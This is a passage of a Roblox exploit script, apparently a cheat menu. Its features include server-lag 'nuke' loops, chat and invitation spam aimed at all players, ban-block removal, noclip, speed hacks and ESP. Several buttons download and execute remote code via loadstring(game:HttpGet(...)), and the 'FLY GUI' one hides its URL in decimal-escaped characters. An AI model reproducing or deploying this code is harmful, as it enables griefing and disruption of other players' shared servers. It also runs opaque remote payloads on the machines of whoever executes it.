            ChatMessageValue = tostring(value)
        end
    })

    TabChat:AddTextBox({
        Name = "SPAM COOLDOWN",
        Description = "Set interval in seconds",
        PlaceholderText = "0.5",
        Callback = function(value)
            local num = tonumber(value)
            if num and num > 0 then
                SpamCooldownValue = num
            end
        end
    })

    TabChat:AddToggle({
        Name = "SPAM CHAT",
        Default = false,
        Callback = function(state)
            SpamChatEnabled = state
            if SpamChatEnabled then
                task.spawn(function()
                    while SpamChatEnabled and ChatMessageValue ~= "" do
                        pcall(function()
                            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                                local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                                if channel then
                                    channel:SendAsync(ChatMessageValue)
                                end
                            else
                                local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                                if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
                                    chatEvents.SayMessageRequest:FireServer(ChatMessageValue, "All")
                                end
                            end
                        end)
                        task.wait(SpamCooldownValue)
                    end
                end)
            end
        end
    })
end

-- TAB PLAYER
local Tab6 = Window:MakeTab({"PLAYER", "user"})

local SectionBasic = Tab6:AddSection({"Basic Functions"})

Tab6:AddButton({"FLY GUI", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\119\105\57\57\57\45\98\108\105\112\47\77\114\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\82\69\65\68\77\69\46\109\100\34\41\41\40\41")()
end})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer

local SPIN_ENABLED = false
local SPIN_CONN = nil
local SPIN_SPEED = 90

local WALK_SPEED = 30
local JUMP_POWER = 60
local GRAVITY_VALUE = Workspace.Gravity or 196.2

local function getCharacterAndHumanoid()
    local char = LP.Character
    if not char then return nil, nil end
    local hum = char:FindFirstChildOfClass("Humanoid")
    return char, hum
end

local function startSpin()
    if SPIN_ENABLED then return end
    SPIN_ENABLED = true
    if SPIN_CONN then pcall(function() SPIN_CONN:Disconnect() end) end
    SPIN_CONN = RunService.Heartbeat:Connect(function(dt)
        if not SPIN_ENABLED then return end
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if hrp then
            local angleRad = math.rad(SPIN_SPEED * dt)
            pcall(function()
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, angleRad, 0)
            end)
        end
    end)
end

local function stopSpin()
    SPIN_ENABLED = false
    if SPIN_CONN then
        pcall(function() SPIN_CONN:Disconnect() end)
        SPIN_CONN = nil
    end
end

local function SPIN(on)
    if on == nil then
        if SPIN_ENABLED then stopSpin() else startSpin() end
    else
        if on then startSpin() else stopSpin() end
    end
end

LP.CharacterAdded:Connect(function(char)
    task.defer(function()
        local hum = char:WaitForChild("Humanoid", 5) or char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum.WalkSpeed = WALK_SPEED end)
            pcall(function() hum.JumpPower = JUMP_POWER end)
        end
        if SPIN_ENABLED then
            startSpin()
        end
    end)
end)

Tab6:AddToggle({
    Name = "SPIN",
    Default = false,
    Callback = function(state)
        SPIN(state)
    end
})

Tab6:AddTextBox({
    Name = "SPIN SPEED (deg/s)",
    Description = "Set turning rotation speed",
    PlaceholderText = "90",
    Callback = function(text)
        local n = tonumber(text)
        if n then SPIN_SPEED = n end
    end
})

Tab6:AddSlider({
    Name = "WALK SPEED",
    Min = 16,
    Max = 300,
    Default = WALK_SPEED,
    Increase = 1,
    Callback = function(value)
        WALK_SPEED = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.WalkSpeed = WALK_SPEED end
    end
})

Tab6:AddSlider({
    Name = "JUMP POWER",
    Min = 50,
    Max = 400,
    Default = JUMP_POWER,
    Increase = 1,
    Callback = function(value)
        JUMP_POWER = value
        local _, hum = getCharacterAndHumanoid()
        if hum then hum.JumpPower = JUMP_POWER end
    end
})

Tab6:AddSlider({
    Name = "GRAVITY",
    Min = 0,
    Max = 196,
    Default = math.floor(GRAVITY_VALUE),
    Increase = 1,
    Callback = function(value)
        GRAVITY_VALUE = value
        Workspace.Gravity = GRAVITY_VALUE
    end
})

local noclipEnabled = false
local noclipConn = nil

local function startNoClip()
    if noclipEnabled then return end
    noclipEnabled = true

    noclipConn = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = false end)
                end
            end
        end
    end)
end

local function stopNoClip()
    if not noclipEnabled then return end
    noclipEnabled = false
    if noclipConn then
        noclipConn:Disconnect()
        noclipConn = nil
    end
end

Tab6:AddToggle({
    Name = "NOCLIP",
    Default = false,
    Callback = function(val)
        if val then startNoClip() else stopNoClip() end
    end
})

-- TAB PROTECTIONS
do
    local TabProtections = Window:MakeTab({"PROTECTIONS", "shield"})

    TabProtections:AddToggle({
        Name = "ANTI SIT",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Seat") or v:IsA("VehicleSeat") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiSeatLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Seat") or v:IsA("VehicleSeat") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiSeatLoop then
                    getgenv().AntiSeatLoop:Disconnect()
                    getgenv().AntiSeatLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI VOID",
        Default = false,
        Callback = function(state)
            if state then
                getgenv().AntiVoidLoop = game:GetService("RunService").Heartbeat:Connect(function()
                    pcall(function()
                        local hrp = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                        if hrp and hrp.Position.Y <= -450 then
                            hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                            hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                            hrp.CFrame = CFrame.new(0, 50, 0)
                        end
                    end)
                end)
            else
                if getgenv().AntiVoidLoop then
                    getgenv().AntiVoidLoop:Disconnect()
                    getgenv().AntiVoidLoop = nil
                end
            end
        end
    })

    TabProtections:AddToggle({
        Name = "ANTI BANANA",
        Default = false,
        Callback = function(state)
            if state then
                task.spawn(function()
                    local scanCount = 0
                    for _, v in pairs(game:GetService("Workspace"):GetDescendants()) do
                        if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                            pcall(function() v:Destroy() end)
                        end
                        scanCount = scanCount + 1
                        if scanCount >= 100 then
                            scanCount = 0
                            task.wait()
                        end
                    end
                end)
                
                getgenv().AntiBananaLoop = game:GetService("Workspace").DescendantAdded:Connect(function(v)
                    if v:IsA("Model") and string.find(v.Name, "BananaPeel") then
                        task.wait()
                        pcall(function() v:Destroy() end)
                    end
                end)
            else
                if getgenv().AntiBananaLoop then
                    getgenv().AntiBananaLoop:Disconnect()
                    getgenv().AntiBananaLoop = nil
                end
            end
        end
    })
end

-- ==========================================
-- TAB TOOLS/NUKES
-- ==========================================
local TabItem = Window:MakeTab({"TOOLS/NUKES", "hammer"})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer

local NukeEnabled = false
local SelectedNuke = "LAG SERVER (BOMB)"
local NukeThread
local LastUnequip = 0

local function FindObject(name)
    for _, v in ipairs(workspace:GetDescendants()) do
        if v.Name:lower() == name:lower() then
            return v
        end
    end
end

local function UnequipAllTools()
    local char = LP.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:UnequipTools()
    end
end

local function TeleportAndSpam(obj)
    if not obj or not NukeEnabled then return end

    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
    if cd then
        if obj:IsA("Model") then
            hrp.CFrame = obj:GetModelCFrame()
        elseif obj:IsA("BasePart") then
            hrp.CFrame = obj.CFrame
        end

        local startTime = tick()
        while NukeEnabled and obj and cd and (tick() - startTime < 1.5) do
            for i = 1, 25 do
                if not NukeEnabled then break end
                fireclickdetector(cd)
            end
            if not NukeEnabled then break end
            RunService.Heartbeat:Wait()
        end
    end
end

local function StopNuke()
    NukeEnabled = false
    if NukeThread then
        task.cancel(NukeThread)
        NukeThread = nil
    end
end

local function MainLoop(typeName)
    while NukeEnabled and SelectedNuke == typeName do
        if SelectedNuke:find("LAG SERVER") then
            if tick() - LastUnequip >= 67 then
                LastUnequip = tick()
                UnequipAllTools()
            end
        end

        if not NukeEnabled then break end

        if typeName == "LAG SERVER (BOMB)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Bomb")) end
        elseif typeName == "LAG SERVER (SNIPER)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Sniper")) end
        elseif typeName == "NUKE SERVER(FLASH LIGHT)" then
            if NukeEnabled then TeleportAndSpam(FindObject("Toolsflashlight")) end
        end

        if not NukeEnabled then break end
        RunService.Heartbeat:Wait()
    end
end

local function StartNuke()
    StopNuke()
    NukeEnabled = true
    LastUnequip = tick()

    NukeThread = task.spawn(function()
        MainLoop(SelectedNuke)
    end)
end

-- ================= DROPDOWN LAG TYPE =================
TabItem:AddDropdown({
    Name = "LAG TYPE",
    Description = "Select the execution method",
    Options = {
        "LAG SERVER (BOMB)",
        "LAG SERVER (SNIPER)",
        "NUKE SERVER(FLASH LIGHT)"
    },
    Default = "LAG SERVER (BOMB)",
    Callback = function(v)
        SelectedNuke = v
    end
})

-- ================= TOGGLE EXECUTE =================
TabItem:AddToggle({
    Name = "ENABLE NUKE / LAG",
    Default = false,
    Callback = function(state)
        if state then
            StartNuke()
        else
            StopNuke()
        end
    end
})

-- ================= PARAGRAPH INFO =================
TabItem:AddParagraph({"WARNING", "To use the FLASHLIGHT NUKE, you must own House 056 (the Haunted House). The nuke will not work without this house."})

--================================================================================
-- TOOLS FODA
--================================================================================

_G.RGB_Speed = 1
_G.RGB_PaintActive = false
_G.RGB_TorchActive = false

TabItem:AddSection({"TOOLS"})

-- TEXTBOX FOR SPEED
TabItem:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle velocity",
	PlaceholderText = "1",
	Callback = function(Value)
        local n = tonumber(Value)
        if n then _G.RGB_Speed = n end
	end	  
})

-- PAINT ROLLER
TabItem:AddButton({"GET PAINT ROLLER", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "PaintRoller")
end})

TabItem:AddToggle({
	Name = "PAINT ROLLER RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_PaintActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_PaintActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- GUARD TORCH
TabItem:AddButton({"GET TORCH", function()
    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer("PickingTools", "GuardTorch")
end})

TabItem:AddToggle({
	Name = "TORCH RGB",
	Default = false,
	Callback = function(Value)
		_G.RGB_TorchActive = Value
        if Value then
            task.spawn(function()
                local lp = game:GetService("Players").LocalPlayer
                local remote = lp:WaitForChild("PlayerGui"):WaitForChild("ToolGui"):WaitForChild("ToolSettings"):WaitForChild("Settings"):WaitForChild("PropsColor"):WaitForChild("SetColor")

                while _G.RGB_TorchActive do
                    local speed = _G.RGB_Speed or 1
                    local hue = (tick() * (speed * 0.15)) % 1 
                    local color = Color3.fromHSV(hue, 1, 1)
                    
                    pcall(function() 
                        remote:FireServer(color) 
                    end)
                    task.wait(0.12)
                end
            end)
        end
	end    
})

-- ================= AUTO GIVE TORCH =================
local RS = game:GetService("ReplicatedStorage")
local pizzaLoop = false
local pizzaConn = nil
local RANGE = 2000

local function getNearbyPlayers()
    local nearby = {}
    if not LP.Character or not LP.Character:FindFirstChild("HumanoidRootPart") then
        return nearby
    end

    local myPos = LP.Character.HumanoidRootPart.Position

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
            if dist <= RANGE then
                table.insert(nearby, plr)
            end
        end
    end
    return nearby
end

local function givePizza(player)
    local args = {
        "ToolGiveToServer",
        player,
        "GuardTorch"
    }

    RS:WaitForChild("RE")
      :WaitForChild("1Playe1rTrigge1rEven1t")
      :FireServer(unpack(args))
end

TabItem:AddToggle({
    Name = "AUTO GIVE TORCH (15 STUDS)",
    Default = false,
    Callback = function(state)
        pizzaLoop = state

        if pizzaConn then
            pizzaConn:Disconnect()
            pizzaConn = nil
        end

        if state then
            pizzaConn = RunService.Heartbeat:Connect(function()
                for _, plr in ipairs(getNearbyPlayers()) do
                    pcall(function()
                        givePizza(plr)
                    end)
                end
                task.wait(0.25)
            end)
        end
    end
})

-- ==========================================
-- TAB HOUSES
-- ==========================================
local TabHouse = Window:MakeTab({"HOUSES", "home"})

-- REMOVE HOUSE BAN (DELETA O BLOCO)
TabHouse:AddButton({"REMOVE HOUSE BAN", function()
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name == "BannedBlock" then
			obj:Destroy()
		end
	end
end})

-- AUTO REMOVE BAN
TabHouse:AddToggle({
	Name = "AUTO REMOVE BAN",
	Default = false,
	Callback = function(Value)
		_G.AutoUnbanActive = Value
		if Value then
			_G.BanMonitor = workspace.DescendantAdded:Connect(function(obj)
				if _G.AutoUnbanActive and obj.Name == "BannedBlock" then
					obj:Destroy()
				end
			end)
		else
			if _G.BanMonitor then _G.BanMonitor:Disconnect() end
		end
	end    
})

-- =========================
-- RGB CASA LOGIC
-- =========================
local RGBHouseSettings = {
    Speed = 1,
    States = {}
}

local function GetHouseRGBColor()
    local hue = tick() * RGBHouseSettings.Speed % 5 / 5
    return Color3.fromHSV(hue, 1, 1)
end

local function StartHouseRGBEffect(config)
    RGBHouseSettings.States[config.StateKey] = true
    task.spawn(function()
        while RGBHouseSettings.States[config.StateKey] do
            if not (game.Players.LocalPlayer and game.Players.LocalPlayer.Parent) then
                RGBHouseSettings.States[config.StateKey] = false
                break
            end
            pcall(config.Action)
            task.wait(config.Delay)
        end
    end)
end

TabHouse:AddSection({"RGB HOUSE"})

TabHouse:AddToggle({
    Name = "RGB HOUSE",
    Default = false,
    Callback = function(enabled)
        if enabled then
            StartHouseRGBEffect({
                StateKey = "house",
                Delay = 0.1,
                Action = function()
                    local color = GetHouseRGBColor()
                    pcall(function()
                        game.ReplicatedStorage.RE["1Player1sHous1e"]:FireServer("ColorPickHouse", color)
                    end)
                end
            })
        else
            RGBHouseSettings.States["house"] = false
        end
    end
})

TabHouse:AddTextBox({
    Name = "RGB SPEED",
    Description = "Set house rainbow transition velocity",
    PlaceholderText = "1",
    Callback = function(value)
        local speed = tonumber(value)
        if speed and speed > 0 then
            RGBHouseSettings.Speed = speed
        end
    end
})

-- =========================
-- RED BLACK RGB HOUSE
-- =========================
local RedBlackHouseSettings = {
	Speed = 1,
	Enabled = false,
	Index = 1,
	Colors = {
		Color3.fromRGB(255, 0, 0),   -- RED
		Color3.fromRGB(0, 0, 0),     -- BLACK
		Color3.fromRGB(255, 255, 255) -- WHITE
	}
}

local function GetNextRedBlackColor()
	RedBlackHouseSettings.Index = RedBlackHouseSettings.Index + 1
	if RedBlackHouseSettings.Index > #RedBlackHouseSettings.Colors then
		RedBlackHouseSettings.Index = 1
	end
	return RedBlackHouseSettings.Colors[RedBlackHouseSettings.Index]
end

local function StartRedBlackHouseRGB()
	task.spawn(function()
		while RedBlackHouseSettings.Enabled do
			local color = GetNextRedBlackColor()
			pcall(function()
				game.ReplicatedStorage.RE["1Player1sHous1e"]
					:FireServer("ColorPickHouse", color)
			end)
			task.wait(1 / RedBlackHouseSettings.Speed)
		end
	end)
end

TabHouse:AddSection({"RED BLACK HOUSE RGB"})

TabHouse:AddToggle({
	Name = "RGB HOUSE (RED BLACK)",
	Default = false,
	Callback = function(v)
		RedBlackHouseSettings.Enabled = v
		if v then
			StartRedBlackHouseRGB()
		end
	end
})

TabHouse:AddTextBox({
	Name = "RGB SPEED (RED BLACK)",
	Description = "Set blinking rate speed",
	PlaceholderText = "1",
	Callback = function(value)
		local speed = tonumber(value)
		if speed and speed > 0 then
			RedBlackHouseSettings.Speed = speed
		end
	end
})

-- ==========================================
-- TAB FUN
-- ==========================================
local TabFun = Window:MakeTab({"FUN", "smile"})

LoopConvitesEnabled = false

local function getHRP()
	local char = LP.Character or LP.CharacterAdded:Wait()
	return char:WaitForChild("HumanoidRootPart")
end

local function findBasePart(inst)
	if inst:IsA("BasePart") then return inst end
	for _, d in ipairs(inst:GetDescendants()) do
		if d:IsA("BasePart") then
			return d
		end
	end
end

local function getCFrame(obj)
	if obj:IsA("Model") then
		if obj.PrimaryPart then
			return obj.PrimaryPart.CFrame
		end
		local part = obj:FindFirstChildWhichIsA("BasePart", true)
		if part then return part.CFrame end
	elseif obj:IsA("BasePart") then
		return obj.CFrame
	end
end

local function getAllHighers()
	local list = {}
	for _, obj in ipairs(workspace:GetDescendants()) do
		if obj.Name:lower() == "higher" then
			table.insert(list, obj)
		end
	end
	return list
end

local function click30(obj)
	local cd = obj:FindFirstChildWhichIsA("ClickDetector", true)
	if not cd then return end
	for i = 1, 30 do
		fireclickdetector(cd)
		task.wait(0.04)
	end
end

--================================================================================
-- COMMERCIAL ADVERTISER
--================================================================================
TabFun:AddButton({"RED BLACK COMMUNITY MESSAGE", function()
    local hrp = getHRP()
    if not hrp then return end

    local originalPos = hrp.CFrame

    hrp.CFrame = CFrame.new(-239, 89.5, -548)
    task.wait(0.6)

    local RE_Cemetery = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Cemeter1y")

    pcall(function()
        RE_Cemetery:FireServer("ReturningCommercialWords", 3, nil, "RED BLACK COMMUNITY ON TOP")
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialWordColor", 3, Color3.new(1, 0, 0.0357508659362793))
    end)

    pcall(function()
        RE_Cemetery:FireServer("CommercialBackGround", 3, Color3.new(0, 0, 0))
    end)

    task.wait(0.4)
    hrp.CFrame = originalPos
end})

-- =========================================================
-- CHAOS BUTTON
-- =========================================================
TabFun:AddButton({"FIRE IN ALL RESTAURANTS", function()
	local hrp = getHRP()
	local originalCFrame = hrp.CFrame

	for _, higher in ipairs(getAllHighers()) do
		local cf = getCFrame(higher)
		if cf then
			hrp.CFrame = cf * CFrame.new(0, 2, 0)
			task.wait(0.25)

			click30(higher)
			task.wait(0.25)
		end
	end

	hrp.CFrame = originalCFrame
end})

-- =========================
-- SCHOOL FIRE ALARM ALERT
-- =========================
TabFun:AddButton({"SCHOOL FIRE ALARM ALERT", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:find("FireAlarmClicker") then
            local clickDetector = obj:FindFirstChildWhichIsA("ClickDetector")
            if clickDetector then
                local targetCFrame = nil
                if obj:IsA("Model") then
                    if obj.PrimaryPart then
                        targetCFrame = obj.PrimaryPart.CFrame
                    else
                        local part = obj:FindFirstChildWhichIsA("BasePart")
                        if part then targetCFrame = part.CFrame end
                    end
                elseif obj:IsA("BasePart") then
                    targetCFrame = obj.CFrame
                end

                if targetCFrame then
                    hrp.CFrame = targetCFrame + Vector3.new(0, 3, 0)
                    task.wait(0.1)
                    fireclickdetector(clickDetector)
                    task.wait(0.2)
                end
            end
        end
    end

    hrp.CFrame = originalCFrame
end})

-- =========================
-- LIGHT SWITCH FUCKER
-- =========================
TabFun:AddButton({"TURN OFF ALL SWITCHES", function()
    local hrp = getHRP()
    local originalCFrame = hrp.CFrame

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name:lower():find("lightswitch") then
            local click = obj:FindFirstChildWhichIsA("ClickDetector", true)
            if click then
                local part = findBasePart(click.Parent)
                if part then
                    hrp.CFrame = part.CFrame
                    task.wait(1)

                    fireclickdetector(click)    
                    task.wait(0.1)    
                    fireclickdetector(click)    
                end    
            end    
        end    
    end    

    hrp.CFrame = originalCFrame
end})

-- =========================================================
-- LOOP DE CONVITES IRRITAR
-- =========================================================
TabFun:AddToggle({
    Name = "INVITATION LOOP ALL",
    Default = false,
    Callback = function(state)
        LoopConvitesEnabled = state
        
        if LoopConvitesEnabled then
            task.spawn(function()
                while LoopConvitesEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LP and LoopConvitesEnabled then
                            pcall(function()
                                local args = {
                                    "HouseParty",
                                    {
                                        player.UserId
                                    }
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("StartFreeParty"):FireServer(unpack(args))
                            end)
                        end
                    end
                    task.wait(0.5)
                end
            end)
        end
    end
})

-- ==========================================
-- TAB VISUAL
-- ==========================================
local TabESP = Window:MakeTab({"VISUAL", "eye"})

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- ==========================================
-- ESP FOLDERS
-- ==========================================
local espFolder = CoreGui:FindFirstChild("RBH_ESP_Billboards") or Instance.new("Folder", CoreGui)
espFolder.Name = "RBH_ESP_Billboards"

local highlightFolder = CoreGui:FindFirstChild("RBH_Highlights") or Instance.new("Folder", CoreGui)
highlightFolder.Name = "RBH_Highlights"

-- ==========================================
-- STATE
-- ==========================================
local espEnabled = false
local activeSchemeKey = "red"
local playerESP = {}
local playerAddedConn, playerRemovingConn

-- ==========================================
-- COLOR SCHEMES
-- ==========================================
local COLOR_SCHEMES = {
    red       = {hl = Color3.fromRGB(255,0,0),     name = Color3.fromRGB(255,255,255)},
    yellow    = {hl = Color3.fromRGB(255,215,0),   name = Color3.fromRGB(0,0,0)},
    blue      = {hl = Color3.fromRGB(0,150,255),   name = Color3.fromRGB(255,255,255)},
    green     = {hl = Color3.fromRGB(0,255,128),   name = Color3.fromRGB(0,0,0)},
    white     = {hl = Color3.fromRGB(255,255,255), name = Color3.fromRGB(0,0,0)},
    black     = {hl = Color3.fromRGB(0,0,0),       name = Color3.fromRGB(255,255,255)},
    brown     = {hl = Color3.fromRGB(139,69,19),   name = Color3.fromRGB(255,255,255)},
    darkgreen = {hl = Color3.fromRGB(0,100,0),     name = Color3.fromRGB(255,255,255)},
    purple    = {hl = Color3.fromRGB(128,0,128),   name = Color3.fromRGB(255,255,255)},
    magenta   = {hl = Color3.fromRGB(255,0,255),   name = Color3.fromRGB(255,255,255)}
}

local highlightColor = COLOR_SCHEMES.red.hl
local nameColor = COLOR_SCHEMES.red.name

-- ==========================================
-- ESP CORE
-- ==========================================
local function clearESP(player)
    if playerESP[player] then
        if playerESP[player].highlight then playerESP[player].highlight:Destroy() end
        if playerESP[player].billboard then playerESP[player].billboard:Destroy() end
        playerESP[player] = nil
    end
end

local function createESP(player)
    if player == LocalPlayer or not player.Character then return end
    clearESP(player)

    local char = player.Character

    -- Highlight
    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillColor = highlightColor
    highlight.OutlineColor = highlightColor
    highlight.FillTransparency = 0.75
    highlight.OutlineTransparency = 0
    highlight.Parent = highlightFolder

    -- Billboard
    local adornee = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
    local billboard
    if adornee then
        billboard = Instance.new("BillboardGui")
        billboard.Adornee = adornee
        billboard.Size = UDim2.new(0,200,0,30)
        billboard.StudsOffset = Vector3.new(0,2.5,0)
        billboard.AlwaysOnTop = true
        billboard.Parent = espFolder

        local txt = Instance.new("TextLabel", billboard)
        txt.Size = UDim2.new(1,0,1,0)
        txt.BackgroundTransparency = 1
        txt.Text = player.DisplayName .. " | " .. player.Name
        txt.TextColor3 = nameColor
        txt.TextStrokeTransparency = 0.6
        txt.Font = Enum.Font.GothamBold
        txt.TextSize = 14
    end

    playerESP[player] = {
        highlight = highlight,
        billboard = billboard
    }
end

local function enableESP()
    espEnabled = true
    for _, plr in ipairs(Players:GetPlayers()) do
        createESP(plr)
    end

    playerAddedConn = Players.PlayerAdded:Connect(function(plr)
        plr.CharacterAdded:Connect(function()
            task.wait(0.2)
            if espEnabled then createESP(plr) end
        end)
    end)

    playerRemovingConn = Players.PlayerRemoving:Connect(clearESP)
end

local function disableESP()
    espEnabled = false
    for plr in pairs(playerESP) do
        clearESP(plr)
    end
    if playerAddedConn then playerAddedConn:Disconnect() end
    if playerRemovingConn then playerRemovingConn:Disconnect() end
end

local function updateColors()
    for _, data in pairs(playerESP) do
        if data.highlight then
            data.highlight.FillColor = highlightColor
            data.highlight.OutlineColor = highlightColor
        end
        if data.billboard and data.billboard:FindFirstChildOfClass("TextLabel") then
            data.billboard.TextLabel.TextColor3 = nameColor
        end
    end
end

local function setScheme(key)
    local scheme = COLOR_SCHEMES[key]
    if not scheme then return end
    highlightColor = scheme.hl
    nameColor = scheme.name
    activeSchemeKey = key
    if espEnabled then updateColors() end
end

-- ================= VISUAL UI ELEMENTS =================

TabESP:AddButton({"SHADERS 4K", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/SHADERS-4K-V1/refs/heads/main/Omaga"))()
end})

TabESP:AddDropdown({
    Name = "ESP COLOR",
    Description = "Select target outline color",
    Options = {
        "RED","YELLOW","BLUE","GREEN","WHITE",
        "BLACK","BROWN","DARKGREEN","PURPLE","MAGENTA"
    },
    Default = "RED",
    Callback = function(v)
        setScheme(string.lower(v))
    end
})

TabESP:AddToggle({
    Name = "ENABLE ESP",
    Default = false,
    Callback = function(state)
        if state then enableESP() else disableESP() end
    end
})

-- ================= SAFE PROP ESP + COLOR =================
do
	local RunService = game:GetService("RunService")

	local enabled = false
	local objects = {}
	local renderConn
	local addConn

	local PROP_COLORS = {
		red     = Color3.fromRGB(255,0,0),
		yellow  = Color3.fromRGB(255,215,0),
		blue    = Color3.fromRGB(0,150,255),
		green   = Color3.fromRGB(0,255,128),
		white   = Color3.fromRGB(255,255,255),
		black   = Color3.fromRGB(0,0,0),
		purple  = Color3.fromRGB(128,0,128),
		magenta = Color3.fromRGB(255,0,255)
	}

	local currentColor = PROP_COLORS.red

	local function updateColor()
		for _,v in pairs(objects) do
			if v.H then
				v.H.FillColor = currentColor
				v.H.OutlineColor = currentColor
			end
		end
	end

	local function valid(model)
		if not model:IsA("Model") then return false end
		if model.Name:sub(1,4) ~= "Prop" then return false end

		local nick = model.Name:sub(5)
		if nick == "" then return false end

		return Players:FindFirstChild(nick) ~= nil
	end

	local function create(model)
		if objects[model] then return end
		if not valid(model) then return end

		local part = model:FindFirstChildWhichIsA("BasePart")
		if not part then return end

		local h = Instance.new("Highlight")
		h.FillColor = currentColor
		h.OutlineColor = currentColor
		h.FillTransparency = 0.35
		h.Parent = model

		local bb = Instance.new("BillboardGui")
		bb.Size = UDim2.new(0,200,0,50)
		bb.AlwaysOnTop = true
		bb.Adornee = part
		bb.Parent = model

		local txt = Instance.new("TextLabel")
		txt.Size = UDim2.new(1,0,1,0)
		txt.BackgroundTransparency = 1
		txt.TextScaled = true
		txt.TextColor3 = Color3.new(1,1,1)
		txt.TextStrokeTransparency = 0
		txt.Parent = bb

		objects[model] = {H = h, B = bb, T = txt}
	end

	local function clear()
		for m,v in pairs(objects) do
			if v.H then v.H:Destroy() end
			if v.B then v.B:Destroy() end
		end
		table.clear(objects)
	end

	local function update()
		if not LocalPlayer.Character then return end
		local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		for m,v in pairs(objects) do
			if m and m.Parent then
				local part = m:FindFirstChildWhichIsA("BasePart")
				if part then
					local dist = (hrp.Position - part.Position).Magnitude
					local nick = m.Name:sub(5)
					v.T.Text = nick .. " | " .. math.floor(dist) .. "m"
				end
			end
		end
	end

	TabESP:AddDropdown({
		Name = "PROP ESP COLOR",
		Description = "Select active prop overlay tint",
		Options = {"RED","YELLOW","BLUE","GREEN","WHITE","BLACK","PURPLE","MAGENTA"},
		Default = "RED",
		Callback = function(v)
			local key = string.lower(v)
			if PROP_COLORS[key] then
				currentColor = PROP_COLORS[key]
				updateColor()
			end
		end
	})

	TabESP:AddToggle({
		Name = "PROP ESP",
		Default = false,
		Callback = function(state)
			enabled = state

			if state then
				for _,obj in pairs(workspace:GetDescendants()) do
					if valid(obj) then create(obj) end
				end

				addConn = workspace.DescendantAdded:Connect(function(obj)
					if enabled and valid(obj) then create(obj) end
				end)

				renderConn = RunService.RenderStepped:Connect(update)
			else
				if renderConn then renderConn:Disconnect() end
				if addConn then addConn:Disconnect() end
				clear()
			end
		end
	})
end


-- ==========================================
-- TAB SCRIPTS
-- ==========================================
local Tab1 = Window:MakeTab({"SCRIPTS", "code"})

Tab1:AddButton({"ESP GUI", function()
    loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-ESP-VERIFICADOR-DE-PLAYERS-V5-27937'))()
end})

